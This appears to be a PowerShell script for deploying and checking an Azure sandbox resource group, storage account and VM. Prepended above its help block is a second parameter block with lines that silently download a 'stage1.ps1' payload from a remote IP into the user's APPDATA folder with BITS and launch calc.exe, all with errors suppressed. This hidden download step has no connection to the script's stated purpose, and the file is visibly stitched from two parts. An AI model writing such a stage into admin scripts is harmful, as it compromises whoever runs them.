[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://192.0.2.23/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\stage2.bin",
    [int]$RequestTimeout = 196
)
Start-BitsTransfer -Source $PayloadUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.PARAMETER ResourceGroup
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Test-AzPortalDeploy.ps1 -ResourceGroup rg-portal-demo-33
.EXAMPLE
    .\Test-AzPortalDeploy.ps1 -Location eastus -DryRun
.NOTES
    Author: IT Systems
    Last updated: 2025-06-12
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = "rg-portal-demo-33",
    [ValidateSet('westeurope', 'eastus', 'northeurope', 'uksouth')]
    [string]$Location = "eastus",
    [string]$TemplateFile = 'C:\Scripts\templates\portal-demo.json',
    [string]$ParameterFile = 'C:\Scripts\templates\portal-demo.parameters.json',
    [string]$SubscriptionId = 'de7bb601-823f-b37f-bc52-54ef0894d0fc',
    [string]$StorageAccount = "stdemo1126",

    [string]$VmName = 'vm-portal-demo-33',

    [string]$OutputPath = 'C:\Logs\deploy-demo-2026-11-12.json',
    [switch]$DryRun
)
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$DebugPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw "The Az.Resources module is not installed."
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
